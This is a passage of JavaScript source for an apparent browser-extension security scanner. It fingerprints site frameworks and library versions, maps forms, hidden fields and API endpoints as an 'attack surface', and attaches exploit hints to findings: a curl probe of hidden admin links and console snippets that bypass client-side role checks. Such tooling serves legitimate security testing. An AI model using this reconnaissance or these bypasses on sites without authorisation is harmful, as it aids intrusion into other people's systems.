/**
 * GodSEye v2.0 — Passive Scanner Engine
 *
 * Zero network requests. Zero noise. Reads only what the browser already loaded.
 * Detection pipeline:
 *   1. Main world injection (globals, DevTools hook, webpack chunks)
 *   2. DOM property analysis (React fiber nodes, Angular attributes)
 *   3. Script banner parsing (/*! lib vX.Y.Z *\/)
 *   4. Script src URL matching
 *   5. Inline source map decoding
 *   6. CSS framework fingerprinting
 *   7. Next.js deep detection
 *   8. CVE matching (only on confirmed versions)
 *   9. Security headers, cookies, secrets, DOM sinks, forms, info disclosure
 */

(() => {
  "use strict";

  /* ================================================================== */
  /*  Helpers                                                           */
  /* ================================================================== */

  function semverCmp(a, b) {
    const pa = a.replace(/[^0-9.]/g, "").split(".").map(Number);
    const pb = b.replace(/[^0-9.]/g, "").split(".").map(Number);
    for (let i = 0; i < Math.max(pa.length, pb.length); i++) {
      const diff = (pa[i] || 0) - (pb[i] || 0);
      if (diff !== 0) return diff < 0 ? -1 : 1;
    }
    return 0;
  }

  function isBelow(ver, ceil) { return semverCmp(ver, ceil) < 0; }

  function isValidVersion(v) { return /^\d+\.\d+(\.\d+)?/.test(v); }

  /* ================================================================== */
  /*  1. Main World Injection — reads globals from the page context     */
  /* ================================================================== */

  /**
   * Probes the main world via background.js → chrome.scripting.executeScript.
   * This bypasses CSP because the browser executes the script directly,
   * not via inline <script> injection.
   */
  function probeMainWorld() {
    return new Promise((resolve) => {
      const timer = setTimeout(() => resolve({}), 5000);
      try {
        chrome.runtime.sendMessage({ action: "probe_main_world" }, (data) => {
          clearTimeout(timer);
          if (chrome.runtime.lastError || !data) { resolve({}); return; }
          resolve(data);
        });
      } catch (_) {
        clearTimeout(timer);
        resolve({});
      }
    });
  }

  /* ================================================================== */
  /*  2. DOM-only Detection (no injection needed)                       */
  /* ================================================================== */

  function detectFromDOM() {
    const found = new Map();
    const html = document.documentElement.innerHTML.substring(0, 500000);

    // ── Frameworks via DOM attributes & elements ──

    // Angular 2+ (ng-version on root)
    const ngEl = document.querySelector("[ng-version]");
    if (ngEl) found.set("angular", { v: ngEl.getAttribute("ng-version"), m: "ng-version" });

    // AngularJS 1.x (ng-app, ng-controller)
    if (document.querySelector("[ng-app], [data-ng-app], [ng-controller]"))
      found.set("angularjs", { v: "detected", m: "ng-app attr" });

    // React — multiple detection methods
    const reactRoot = document.querySelector("[data-reactroot], #root, #__next, #app");
    if (reactRoot) {
      const keys = Object.keys(reactRoot);
      if (keys.some(k => k.startsWith("__reactContainer$"))) found.set("react", { v: "18+", m: "__reactContainer$" });
      else if (keys.some(k => k.startsWith("__reactFiber$"))) found.set("react", { v: "17+", m: "__reactFiber$" });
      else if (keys.some(k => k.startsWith("__reactInternalInstance$"))) found.set("react", { v: "16.x", m: "__reactInternalInstance$" });
      else if (keys.some(k => k.startsWith("__react"))) found.set("react", { v: "detected", m: "DOM props" });
    }
    if (document.querySelector('[id^=":r"]')) found.set("__reactUseId", { v: "18+", m: "useId pattern" });

    // Svelte
    if (document.querySelector("[data-svelte-h]") || /class="svelte-/.test(html))
      found.set("svelte", { v: "detected", m: "DOM markers" });

    // Nuxt
    if (html.includes("window.__NUXT__") || document.getElementById("__nuxt") || document.getElementById("__layout"))
      found.set("nuxt", { v: "detected", m: "__NUXT__" });

    // Gatsby
    if (document.getElementById("___gatsby"))
      found.set("gatsby", { v: "detected", m: "#___gatsby" });

    // Remix
    if (html.includes("window.__remixContext") || html.includes("__remix"))
      found.set("remix", { v: "detected", m: "__remixContext" });

    // Next.js
    if (document.getElementById("__next")) found.set("__nextDiv", { v: true });
    if (/(window|self)\.__next_f\s*=/.test(html)) found.set("__nextAppRouter", { v: true });
    if (document.querySelector('meta[name="next-head-count"]')) found.set("__nextPagesRouter", { v: true });
    if (document.querySelector('script[src*="/_next/"]')) {
      if (!found.has("next")) found.set("next", { v: "detected", m: "_next/ scripts" });
    }

    // Vue.js — data-v- attribute prefix (scoped styles)
    if (document.querySelector("[data-v-]") || document.querySelector('[class*="v-"]') || html.includes("data-v-"))
      found.set("vue", { v: "detected", m: "data-v- attrs" });

    // Ember
    if (document.getElementById("ember-basic-dropdown-wormhole") || document.querySelector("[id^='ember']") || html.includes("data-ember"))
      found.set("ember", { v: "detected", m: "ember DOM" });

    // Stimulus (Rails)
    if (document.querySelector("[data-controller]"))
      found.set("stimulus", { v: "detected", m: "data-controller" });

    // Alpine.js
    if (document.querySelector("[x-data], [x-init], [x-show], [x-bind]"))
      found.set("alpinejs", { v: "detected", m: "x-data attrs" });

    // HTMX
    if (document.querySelector("[hx-get], [hx-post], [hx-trigger], [hx-swap]"))
      found.set("htmx", { v: "detected", m: "hx- attrs" });

    // Lit / Web Components
    if (document.querySelector("[lit-html]") || html.includes("lit-html"))
      found.set("lit", { v: "detected", m: "lit-html" });

    // ── Libraries via script tags & inline patterns ──

    // jQuery (check for jQuery-specific elements)
    if (document.querySelector("[class*='ui-widget'], [class*='ui-dialog'], [class*='ui-datepicker']"))
      found.set("jquery-ui", { v: "detected", m: "ui- classes" });

    // Bootstrap (via class patterns)
    if (document.querySelector(".navbar, .btn, .container-fluid, .modal-dialog, .carousel"))
      found.set("bootstrap", { v: "detected", m: "CSS classes" });

    // Font Awesome
    if (document.querySelector("link[href*='font-awesome'], link[href*='fontawesome'], .fa, .fas, .far, .fab"))
      found.set("fontawesome", { v: "detected", m: "CSS/link" });

    // Moment.js — often left as a comment or in error messages
    if (html.includes("moment.js") || html.includes("moment.min.js"))
      found.set("moment", { v: "detected", m: "HTML reference" });

    // ── CMS Detection ──

    // WordPress
    if (html.includes("/wp-content/") || html.includes("/wp-includes/")) {
      found.set("wordpress", { v: "detected", m: "wp-content path" });
      const gen = document.querySelector('meta[name="generator"]');
      if (gen && /wordpress/i.test(gen.content)) {
        const vm = gen.content.match(/WordPress\s+([\d.]+)/i);
        if (vm) found.set("wordpress", { v: vm[1], m: "meta generator" });
      }
    }

    // Drupal
    if (document.querySelector('meta[name="Generator"][content*="Drupal"]') || html.includes("/sites/default/files/"))
      found.set("drupal", { v: "detected", m: "meta/paths" });

    // Joomla
    if (html.includes("/media/jui/") || html.includes("/components/com_") || document.querySelector('meta[name="generator"][content*="Joomla"]'))
      found.set("joomla", { v: "detected", m: "meta/paths" });

    // Shopify
    if (html.includes("cdn.shopify.com") || html.includes("Shopify.shop"))
      found.set("shopify", { v: "detected", m: "CDN/globals" });

    // Squarespace
    if (html.includes("squarespace.com") || html.includes("static.squarespace"))
      found.set("squarespace", { v: "detected", m: "CDN" });

    // Wix
    if (html.includes("static.wixstatic.com") || html.includes("wix.com"))
      found.set("wix", { v: "detected", m: "CDN" });

    // ── Server/Runtime indicators ──

    // PHP
    if (document.querySelector('input[name="PHPSESSID"]') || html.includes(".php"))
      found.set("php", { v: "detected", m: "file extensions" });

    // ASP.NET
    if (document.querySelector('input[name="__VIEWSTATE"], input[name="__EVENTVALIDATION"]'))
      found.set("asp.net", { v: "detected", m: "__VIEWSTATE" });

    // Rails
    if (document.querySelector('meta[name="csrf-param"][content="authenticity_token"]'))
      found.set("rails", { v: "detected", m: "authenticity_token" });

    // Django
    if (document.querySelector('input[name="csrfmiddlewaretoken"]'))
      found.set("django", { v: "detected", m: "csrfmiddlewaretoken" });

    // Laravel
    if (document.querySelector('meta[name="csrf-token"]') && html.includes("laravel"))
      found.set("laravel", { v: "detected", m: "csrf-token meta" });

    // ── Inline script deep scan for library references ──

    const inlineScripts = document.querySelectorAll("script:not([src])");
    for (const el of inlineScripts) {
      const text = el.textContent.substring(0, 5000);

      // Socket.IO
      if (/io\s*\(\s*['"]/.test(text) || /socket\.on\s*\(/.test(text))
        if (!found.has("socket.io")) found.set("socket.io", { v: "detected", m: "inline pattern" });

      // GraphQL
      if (/graphql|__schema|query\s*\{/.test(text))
        if (!found.has("graphql")) found.set("graphql", { v: "detected", m: "inline pattern" });

      // Firebase
      if (/firebase|firebaseConfig|initializeApp/.test(text))
        if (!found.has("firebase")) found.set("firebase", { v: "detected", m: "inline pattern" });

      // Stripe
      if (/Stripe\s*\(|stripe\.com\/v3/.test(text))
        if (!found.has("stripe.js")) found.set("stripe.js", { v: "detected", m: "inline pattern" });

      // Google Analytics / Tag Manager
      if (/gtag|google-analytics|GoogleAnalyticsObject|googletagmanager/.test(text))
        if (!found.has("google-analytics")) found.set("google-analytics", { v: "detected", m: "inline" });

      // Sentry
      if (/Sentry\.init|dsn.*sentry/.test(text))
        if (!found.has("sentry")) found.set("sentry", { v: "detected", m: "inline" });

      // Webpack runtime
      if (/webpackChunk|__webpack_require__|webpackJsonp/.test(text))
        if (!found.has("webpack")) found.set("webpack", { v: "detected", m: "runtime" });

      // Vite
      if (/import\.meta\.hot|@vite\/client/.test(text))
        if (!found.has("vite")) found.set("vite", { v: "detected", m: "HMR client" });
    }

    // ── External script src patterns (broad) ──

    document.querySelectorAll("script[src], link[href]").forEach(el => {
      const src = (el.src || el.href || "").toLowerCase();

      if (/tinymce/.test(src) && !found.has("tinymce")) found.set("tinymce", { v: "detected", m: "script src" });
      if (/ckeditor/.test(src) && !found.has("ckeditor")) found.set("ckeditor", { v: "detected", m: "script src" });
      if (/quill/.test(src) && !found.has("quill")) found.set("quill", { v: "detected", m: "script src" });
      if (/chart\.js|chartjs/.test(src) && !found.has("chart.js")) found.set("chart.js", { v: "detected", m: "script src" });
      if (/d3\./.test(src) && !found.has("d3")) found.set("d3", { v: "detected", m: "script src" });
      if (/three\./.test(src) && !found.has("three")) found.set("three", { v: "detected", m: "script src" });
      if (/video\.js|videojs/.test(src) && !found.has("video.js")) found.set("video.js", { v: "detected", m: "script src" });
      if (/leaflet/.test(src) && !found.has("leaflet")) found.set("leaflet", { v: "detected", m: "script src" });
      if (/plyr/.test(src) && !found.has("plyr")) found.set("plyr", { v: "detected", m: "script src" });
      if (/sweetalert/.test(src) && !found.has("sweetalert2")) found.set("sweetalert2", { v: "detected", m: "script src" });
      if (/prism/.test(src) && !found.has("prismjs")) found.set("prismjs", { v: "detected", m: "script src" });
      if (/monaco/.test(src) && !found.has("monaco-editor")) found.set("monaco-editor", { v: "detected", m: "script src" });
      if (/mathjax/.test(src) && !found.has("mathjax")) found.set("mathjax", { v: "detected", m: "script src" });
      if (/datatables/.test(src) && !found.has("datatables")) found.set("datatables", { v: "detected", m: "script src" });
      if (/select2/.test(src) && !found.has("select2")) found.set("select2", { v: "detected", m: "script src" });
      if (/flatpickr/.test(src) && !found.has("flatpickr")) found.set("flatpickr", { v: "detected", m: "script src" });
      if (/swiper/.test(src) && !found.has("swiper")) found.set("swiper", { v: "detected", m: "script src" });
      if (/axios/.test(src) && !found.has("axios")) found.set("axios", { v: "detected", m: "script src" });
      if (/socket\.io/.test(src) && !found.has("socket.io")) found.set("socket.io", { v: "detected", m: "script src" });
      if (/highlight/.test(src) && !found.has("highlight.js")) found.set("highlight.js", { v: "detected", m: "script src" });
      if (/handlebars/.test(src) && !found.has("handlebars")) found.set("handlebars", { v: "detected", m: "script src" });
      if (/mustache/.test(src) && !found.has("mustache")) found.set("mustache", { v: "detected", m: "script src" });
      if (/backbone/.test(src) && !found.has("backbone")) found.set("backbone", { v: "detected", m: "script src" });
      if (/ember/.test(src) && !found.has("ember")) found.set("ember", { v: "detected", m: "script src" });
      if (/electron/.test(src) && !found.has("electron")) found.set("electron", { v: "detected", m: "script src" });
      if (/i18next/.test(src) && !found.has("i18next")) found.set("i18next", { v: "detected", m: "script src" });
      if (/storybook/.test(src) && !found.has("storybook")) found.set("storybook", { v: "detected", m: "script src" });
      if (/lodash/.test(src) && !found.has("lodash")) found.set("lodash", { v: "detected", m: "script src" });
      if (/moment/.test(src) && !found.has("moment")) found.set("moment", { v: "detected", m: "script src" });
      if (/dompurify|purify/.test(src) && !found.has("dompurify")) found.set("dompurify", { v: "detected", m: "script src" });
    });

    return found;
  }

  /* ================================================================== */
  /*  3. Script Banner Parsing                                          */
  /* ================================================================== */

  function parseBanners() {
    const found = new Map();
    const patterns = [
      { lib: "jquery",        re: /\/\*!?\s*jQuery\s+v?([\d.]+)/i },
      { lib: "jquery-ui",     re: /\/\*!?\s*jQuery\s+UI\s[^*]*?([\d.]+)/i },
      { lib: "lodash",        re: /\/\*!?\s*lodash\s+v?([\d.]+)/i },
      { lib: "underscore",    re: /Underscore\.js\s+v?([\d.]+)/i },
      { lib: "backbone",      re: /Backbone\.js\s+v?([\d.]+)/i },
      { lib: "moment",        re: /\/\/!\s*moment\.js[\s\S]{0,200}?([\d]+\.[\d]+\.[\d]+)/i },
      { lib: "vue",           re: /\/\*!?\s*Vue\.js\s+v?([\d.]+)/i },
      { lib: "react",         re: /@license\s+React\s+v?([\d.]+)/i },
      { lib: "react-dom",     re: /@license\s+React(?:DOM|-dom)\s+v?([\d.]+)/i },
      { lib: "bootstrap",     re: /\/\*!?\s*Bootstrap\s+v?([\d.]+)/i },
      { lib: "axios",         re: /\/\*!?\s*[Aa]xios\s+v?([\d.]+)/i },
      { lib: "dompurify",     re: /\/\*!?\s*DOMPurify\s+v?([\d.]+)/i },
      { lib: "handlebars",    re: /\/\*!?\s*Handlebars\s+v?([\d.]+)/i },
      { lib: "d3",            re: /d3js\.org\s+v?([\d.]+)/i },
      { lib: "marked",        re: /\/\*!?\s*marked\s+v?([\d.]+)/i },
      { lib: "chart.js",      re: /\/\*!?\s*Chart\.js\s+v?([\d.]+)/i },
      { lib: "highlight.js",  re: /\/\*!?\s*highlight\.js\s+v?([\d.]+)/i },
      { lib: "prismjs",       re: /\/\*!?\s*Prism(?:\.js)?\s+v?([\d.]+)/i },
      { lib: "socket.io",     re: /\/\*!?\s*Socket\.IO\s+v?([\d.]+)/i },
      { lib: "tinymce",       re: /\/\*!?\s*TinyMCE\s+v?([\d.]+)/i },
      { lib: "ckeditor",      re: /\/\*!?\s*CKEditor\s+v?([\d.]+)/i },
      { lib: "three",         re: /\/\*!?\s*three\.js\s+r?([\d.]+)/i },
      { lib: "leaflet",       re: /\/\*!?\s*Leaflet\s+v?([\d.]+)/i },
      { lib: "datatables",    re: /\/\*!?\s*DataTables\s+v?([\d.]+)/i },
      { lib: "select2",       re: /\/\*!?\s*Select2\s+v?([\d.]+)/i },
      { lib: "sweetalert2",   re: /\/\*!?\s*SweetAlert2\s+v?([\d.]+)/i },
      { lib: "swiper",        re: /\/\*!?\s*Swiper\s+v?([\d.]+)/i },
      { lib: "video.js",      re: /\/\*!?\s*Video\.js\s+v?([\d.]+)/i },
      { lib: "plyr",          re: /\/\*!?\s*Plyr\s+v?([\d.]+)/i },
      { lib: "flatpickr",     re: /\/\*!?\s*flatpickr\s+v?([\d.]+)/i },
      { lib: "ember",         re: /\/\*!?\s*Ember\.js\s+v?([\d.]+)/i },
      { lib: "knockout",      re: /\/\*!?\s*Knockout\s+v?([\d.]+)/i },
      { lib: "angular",       re: /@license\s+Angular\s+v?([\d.]+)/i },
      { lib: "angularjs",     re: /\/\*!?\s*AngularJS\s+v?([\d.]+)/i },
      { lib: "prototype",     re: /Prototype\s+JavaScript.*?v?([\d.]+)/i },
      { lib: "mootools",      re: /\/\*!?\s*MooTools.*?v?([\d.]+)/i },
      { lib: "i18next",       re: /\/\*!?\s*i18next\s+v?([\d.]+)/i },
      { lib: "mathjax",       re: /\/\*!?\s*MathJax\s+v?([\d.]+)/i },
    ];

    // Generic banner catch: /*! library-name v1.2.3 */
    const genericRe = /\/\*!\s*([\w][\w.-]{1,30})\s+v?((\d+)\.(\d+)\.(\d+))/gi;

    const scripts = document.querySelectorAll("script:not([src])");
    for (const el of scripts) {
      const head = el.textContent.substring(0, 3000);
      for (const p of patterns) {
        if (found.has(p.lib)) continue;
        const m = head.match(p.re);
        if (m) found.set(p.lib, { v: m[1], m: "banner" });
      }
      // Generic
      let gm;
      while ((gm = genericRe.exec(head)) !== null) {
        const name = gm[1].toLowerCase();
        if (!found.has(name)) found.set(name, { v: gm[2], m: "banner" });
      }
    }

    // CSS banners (Bootstrap in <style>)
    const styles = document.querySelectorAll("style");
    for (const s of styles) {
      const head = s.textContent.substring(0, 1000);
      const bm = head.match(/\/\*!?\s*Bootstrap\s+v?([\d.]+)/i);
      if (bm && !found.has("bootstrap")) found.set("bootstrap", { v: bm[1], m: "css_banner" });
    }

    return found;
  }

  /* ================================================================== */
  /*  4. Script src URL Pattern Matching                                */
  /* ================================================================== */

  function matchScriptURLs() {
    const found = new Map();
    const patterns = [
      { lib: "jquery",       re: /jquery[.-](\d+\.\d+\.\d+)/i },
      { lib: "jquery-ui",    re: /jquery[.-]ui[.-](\d+\.\d+\.\d+)/i },
      { lib: "bootstrap",    re: /bootstrap[.-](\d+\.\d+\.\d+)/i },
      { lib: "vue",          re: /vue[.-](\d+\.\d+\.\d+)/i },
      { lib: "angularjs",    re: /angular[.-](\d+\.\d+\.\d+)/i },
      { lib: "react",        re: /react[.-](\d+\.\d+\.\d+)/i },
      { lib: "react-dom",    re: /react-dom[.-](\d+\.\d+\.\d+)/i },
      { lib: "moment",       re: /moment[.-](\d+\.\d+\.\d+)/i },
      { lib: "lodash",       re: /lodash[.-](\d+\.\d+\.\d+)/i },
      { lib: "dompurify",    re: /purify[.-](\d+\.\d+\.\d+)/i },
      { lib: "handlebars",   re: /handlebars[.-](\d+\.\d+\.\d+)/i },
      { lib: "axios",        re: /axios[.-](\d+\.\d+\.\d+)/i },
      { lib: "socket.io",    re: /socket\.io[.-](\d+\.\d+\.\d+)/i },
      { lib: "d3",           re: /\bd3[.-](\d+\.\d+\.\d+)/i },
    ];

    const scripts = document.querySelectorAll("script[src]");
    for (const el of scripts) {
      const src = el.src || "";
      for (const p of patterns) {
        if (found.has(p.lib)) continue;
        const m = src.match(p.re);
        if (m) found.set(p.lib, { v: m[1], m: "script_url" });
      }
    }
    return found;
  }

  /* ================================================================== */
  /*  5. Inline Source Map Decoding                                     */
  /* ================================================================== */

  function decodeInlineSourceMaps() {
    const found = new Map();
    const scripts = document.querySelectorAll("script:not([src])");

    for (const el of scripts) {
      const text = el.textContent;
      const match = text.match(/\/\/[#@]\s*sourceMappingURL=data:application\/json;(?:charset=utf-8;)?base64,(\S+)/);
      if (!match) continue;

      try {
        const decoded = atob(match[1]);
        const sourceMap = JSON.parse(decoded);
        if (!sourceMap.sources) continue;

        for (const src of sourceMap.sources) {
          // pnpm: node_modules/.pnpm/react@18.2.0/node_modules/react/...
          const pnpmMatch = src.match(/node_modules\/\.pnpm\/([^@]+)@([\d]+\.[\d]+\.[\d]+[^/]*)/);
          if (pnpmMatch) {
            const name = pnpmMatch[1].replace(/\+/g, "/"); // pnpm encodes / as +
            if (!found.has(name)) found.set(name, { v: pnpmMatch[2], m: "sourcemap_pnpm" });
            continue;
          }
          // Standard: node_modules/package-name/...
          const stdMatch = src.match(/node_modules\/((?:@[^/]+\/)?[^/]+)/);
          if (stdMatch && !found.has(stdMatch[1])) {
            found.set(stdMatch[1], { v: "detected", m: "sourcemap_path" });
          }
        }
      } catch (_) { /* malformed source map */ }
    }
    return found;
  }

  /* ================================================================== */
  /*  6. CSS Framework Fingerprinting                                   */
  /* ================================================================== */

  function detectCSSFrameworks() {
    const found = new Map();
    const html = document.documentElement.innerHTML.substring(0, 200000);

    const checks = [
      { name: "Tailwind CSS",    test: () => /class="[^"]*\b(flex|grid|text-\w+-\d+|bg-\w+-\d+|p-\d|m-\d|rounded-\w+)\b/.test(html) && /class="[^"]*\b(hover:|focus:|sm:|md:|lg:)/.test(html) },
      { name: "Material UI",     test: () => !!document.querySelector("[class*='MuiButton'], [class*='MuiTypography'], [class*='MuiBox']") },
      { name: "Ant Design",      test: () => !!document.querySelector("[class*='ant-btn'], [class*='ant-layout'], [class*='ant-input']") },
      { name: "Chakra UI",       test: () => !!document.querySelector("[class*='chakra-'], .css-0") },
      { name: "Bulma",           test: () => !!document.querySelector(".is-primary.button, .columns .column, .hero.is-fullheight") },
      { name: "Foundation",      test: () => !!document.querySelector(".callout, .grid-x .cell, .top-bar") },
      { name: "Semantic UI",     test: () => !!document.querySelector(".ui.button, .ui.container, .ui.segment") },
      { name: "Vuetify",         test: () => !!document.querySelector("[class*='v-btn'], [class*='v-card'], [class*='v-app-bar']") },
      { name: "Mantine",         test: () => !!document.querySelector("[class*='mantine-']") },
      { name: "Radix UI",        test: () => !!document.querySelector("[data-radix-collection-item], [data-state][data-radix]") },
      { name: "shadcn/ui",       test: () => !!document.querySelector("[class*='rounded-md'][class*='border'][class*='bg-']") && !!document.querySelector("[data-radix-collection-item], [data-state]") },
      { name: "Headless UI",     test: () => !!document.querySelector("[data-headlessui-state]") },
      { name: "PrimeReact",      test: () => !!document.querySelector("[class*='p-button'], [class*='p-datatable']") },
      { name: "Element UI",      test: () => !!document.querySelector("[class*='el-button'], [class*='el-input']") },
    ];

    for (const c of checks) {
      try {
        if (c.test()) found.set(c.name, { v: "detected", m: "css_classes" });
      } catch (_) {}
    }
    return found;
  }

  /* ================================================================== */
  /*  7. Next.js Deep Detection                                         */
  /* ================================================================== */

  function detectNextJsDeep(mainWorldData, domData) {
    const signals = [];
    let version = null;
    let router = null;

    // From main world
    const nw = mainWorldData.next;
    if (nw) {
      if (nw.v && isValidVersion(nw.v)) {
        version = nw.v;
        signals.push({ type: "version", value: nw.v, method: nw.m });
      }
      if (nw.buildId) signals.push({ type: "buildId", value: nw.buildId });
      if (nw.fields) {
        if (nw.fields.includes("scriptLoader")) signals.push({ type: "field", hint: "scriptLoader (>=11.x)" });
        if (nw.fields.includes("isFallback")) signals.push({ type: "field", hint: "isFallback (>=10.x)" });
      }
    }

    // Router type
    if (domData.has("__nextAppRouter")) { router = "App Router"; signals.push({ type: "router", value: "App Router (>=13)" }); }
    if (domData.has("__nextPagesRouter")) { router = router ? "Hybrid" : "Pages Router"; signals.push({ type: "router", value: "Pages Router" }); }

    // Script path analysis
    const scripts = document.querySelectorAll("script[src]");
    for (const s of scripts) {
      const src = s.src;
      if (/\/_next\/static\/chunks\/main-app/.test(src)) signals.push({ type: "chunk", hint: "main-app (App Router)" });
      if (/\/_next\/static\/chunks\/app-router/.test(src)) signals.push({ type: "chunk", hint: "app-router chunk" });
      if (/\[turbopack\]|turbopack/.test(src)) signals.push({ type: "turbopack", hint: "Turbopack (>=13.4)" });
      const dpl = src.match(/[?&]dpl=([^&]+)/);
      if (dpl) signals.push({ type: "vercel", deploymentId: dpl[1] });
      const bmMatch = src.match(/\/_next\/static\/([^/]+)\/_buildManifest\.js/);
      if (bmMatch) signals.push({ type: "buildId_path", value: bmMatch[1] });
    }

    // Inline flight data analysis
    const html = document.documentElement.innerHTML;
    if (/self\.__next_f\.push/.test(html)) signals.push({ type: "flight_push", hint: "RSC Flight data" });
    if (/self\.__BUILD_MANIFEST/.test(html)) signals.push({ type: "build_manifest" });

    // Version range inference
    let inferredRange = null;
    if (!version) {
      if (signals.some(s => s.type === "turbopack")) inferredRange = ">=13.4";
      else if (router === "App Router") inferredRange = ">=13";
      else if (domData.has("__nextPagesRouter")) inferredRange = "Pages Router (any version)";
    }

    // Vulnerability assessment
    let vulnStatus = "unknown";
    if (version) {
      const [major, minor, patch] = version.split(".").map(Number);
      if (major === 15 || (major === 16 && minor === 0 && patch <= 6))
        vulnStatus = "likely_vulnerable";
      else if (major >= 16 && !(minor === 0 && patch <= 6))
        vulnStatus = "patched";
      else if (major <= 14)
        vulnStatus = "check";
    }

    return { version, router, signals, inferredRange, vulnStatus };
  }

  /* ================================================================== */
  /*  8. React Version Inference (from DOM + main world signals)        */
  /* ================================================================== */

  function inferReactVersion(mainWorldData) {
    const mw = mainWorldData;

    // Direct version already found?
    if (mw.react && isValidVersion(mw.react.v)) return null; // already have it

    const signals = [];

    // DOM property analysis
    const rd = mw.__reactDOM;
    if (rd) {
      if (rd.container18) signals.push("React 18+ (__reactContainer$)");
      else if (rd.fiber17) signals.push("React 17+ (__reactFiber$)");
      else if (rd.internal16) signals.push("React 16.x (__reactInternalInstance$)");
    }

    // Feature detection
    const rf = mw.__reactFeatures;
    if (rf) {
      if (rf.use) signals.push("React 19+ (React.use)");
      else if (rf.useId) signals.push("React 18+ (React.useId)");
      else if (rf.startTransition) signals.push("React 18+ (startTransition)");
      else if (rf.lazy) signals.push("React 16.6+ (React.lazy)");
    }

    // useId DOM pattern
    if (document.querySelector('[id^=":r"]')) signals.push("React 18+ (useId DOM pattern)");

    if (signals.length === 0) return null;

    // Infer version range
    let range = "unknown";
    if (signals.some(s => s.includes("19+"))) range = "19.x";
    else if (signals.some(s => s.includes("18+"))) range = "18.x";
    else if (signals.some(s => s.includes("17+"))) range = "17.x";
    else if (signals.some(s => s.includes("16"))) range = "16.x";

    return { range, signals };
  }

  /* ================================================================== */
  /*  9. Attack Surface Map                                             */
  /* ================================================================== */

  function mapAttackSurface() {
    const surface = { forms: [], endpoints: [], params: [], uploads: [], websockets: [], hiddenFields: [] };
    const html = document.documentElement.innerHTML;

    // Forms with details
    document.querySelectorAll("form").forEach(form => {
      const inputs = [];
      form.querySelectorAll("input, textarea, select").forEach(inp => {
        const name = inp.name || inp.id || "";
        if (!name) return;
        inputs.push({ name, type: inp.type || "text", value: inp.value ? inp.value.substring(0, 50) : "" });
      });
      if (inputs.length > 0 || form.action) {
        surface.forms.push({
          action: form.action || location.href,
          method: (form.method || "GET").toUpperCase(),
          inputs,
          hasFile: !!form.querySelector('input[type="file"]'),
          hasPassword: !!form.querySelector('input[type="password"]'),
        });
      }
    });

    // File upload fields
    document.querySelectorAll('input[type="file"]').forEach(inp => {
      const form = inp.closest("form");
      surface.uploads.push({
        name: inp.name || "file",
        accept: inp.accept || "*",
        action: form ? (form.action || location.href) : "unknown",
      });
    });

    // Hidden fields (may contain tokens, IDs, config)
    document.querySelectorAll('input[type="hidden"]').forEach(inp => {
      if (!inp.name) return;
      surface.hiddenFields.push({
        name: inp.name,
        value: inp.value ? inp.value.substring(0, 80) : "",
      });
    });

    // API endpoints from inline scripts
    const endpointRe = /["'](\/(?:api|wp-json|graphql|rest|v[12])\/[^"'\s]{2,80})["']/g;
    const fetchRe = /fetch\s*\(\s*["'`](\/[^"'`\s]{2,100})["'`]/g;
    const xhrRe = /\.open\s*\(\s*["'](GET|POST|PUT|DELETE)["']\s*,\s*["'`](\/[^"'`\s]{2,100})["'`]/g;

    const scripts = document.querySelectorAll("script:not([src])");
    const seenEndpoints = new Set();
    for (const s of scripts) {
      const text = s.textContent.substring(0, 100000);
      let m;

      const re1 = new RegExp(endpointRe.source, "g");
      while ((m = re1.exec(text)) !== null) {
        if (!seenEndpoints.has(m[1])) { seenEndpoints.add(m[1]); surface.endpoints.push({ path: m[1], source: "string_literal" }); }
      }

      const re2 = new RegExp(fetchRe.source, "g");
      while ((m = re2.exec(text)) !== null) {
        if (!seenEndpoints.has(m[1])) { seenEndpoints.add(m[1]); surface.endpoints.push({ path: m[1], source: "fetch()" }); }
      }

      const re3 = new RegExp(xhrRe.source, "g");
      while ((m = re3.exec(text)) !== null) {
        if (!seenEndpoints.has(m[2])) { seenEndpoints.add(m[2]); surface.endpoints.push({ path: m[2], method: m[1], source: "XMLHttpRequest" }); }
      }
    }

    // Also extract from link href and anchor tags
    document.querySelectorAll("a[href]").forEach(a => {
      const href = a.getAttribute("href") || "";
      if (/\/(api|wp-json|graphql|rest)\//i.test(href) && !seenEndpoints.has(href)) {
        seenEndpoints.add(href);
        surface.endpoints.push({ path: href, source: "link" });
      }
    });

    // URL parameters from links
    const paramSet = new Set();
    document.querySelectorAll("a[href*='?'], form[action*='?']").forEach(el => {
      const href = el.href || el.action || "";
      try {
        const url = new URL(href, location.origin);
        for (const [key] of url.searchParams) {
          if (!paramSet.has(key)) { paramSet.add(key); surface.params.push({ name: key, url: url.pathname }); }
        }
      } catch (_) {}
    });

    // Interesting params in current URL
    try {
      for (const [key] of new URL(location.href).searchParams) {
        if (!paramSet.has(key)) { paramSet.add(key); surface.params.push({ name: key, url: location.pathname }); }
      }
    } catch (_) {}

    // WebSocket references
    const wsRe = /["'](wss?:\/\/[^"'\s]+)["']/g;
    for (const s of scripts) {
      const text = s.textContent.substring(0, 50000);
      let m;
      const re = new RegExp(wsRe.source, "g");
      while ((m = re.exec(text)) !== null) {
        surface.websockets.push(m[1]);
      }
    }

    // GraphQL detection
    if (document.querySelector('script[src*="graphql"]') || /graphql/i.test(html.substring(0, 100000))) {
      if (!seenEndpoints.has("/graphql")) surface.endpoints.push({ path: "/graphql", source: "detected" });
    }

    return surface;
  }

  /* ================================================================== */
  /*  10. OWASP Top 10 Passive Scanner                                  */
  /* ================================================================== */

  function scanOWASP() {
    const findings = [];
    const html = document.documentElement.innerHTML.substring(0, 500000);
    let inlineCode = "";
    document.querySelectorAll("script:not([src])").forEach(s => { inlineCode += s.textContent + "\n"; });
    inlineCode = inlineCode.substring(0, 400000);

    const targetUrl = location.origin;
    let host; try { host = location.host; } catch (_) { host = "target"; }

    // ── A01: Broken Access Control ──

    document.querySelectorAll('a[href*="admin"], a[href*="dashboard"], a[href*="manage"]').forEach(link => {
      const style = window.getComputedStyle(link);
      if (style.display === "none" || style.visibility === "hidden") {
        findings.push({ severity: "MEDIUM", title: "Hidden admin link in DOM", detail: link.href, owasp: "A01",
          exploit: [{ name: "curl", cmd: `curl -s -D- "${link.href}" | head -30` }] });
      }
    });

    if (/if\s*\(\s*(?:user\.role|userRole|isAdmin|currentUser\.role)\s*[=!]==?\s*['"`](admin|superadmin)/i.test(inlineCode)) {
      findings.push({ severity: "HIGH", title: "Client-side access control", detail: "Authorization logic in JS — bypassable from DevTools.", owasp: "A01",
        exploit: [{ name: "browser console", cmd: `// Override the check:\nwindow.isAdmin = true;\n// or:\nObject.defineProperty(user, 'role', { get: () => 'admin' });` }] });
    }

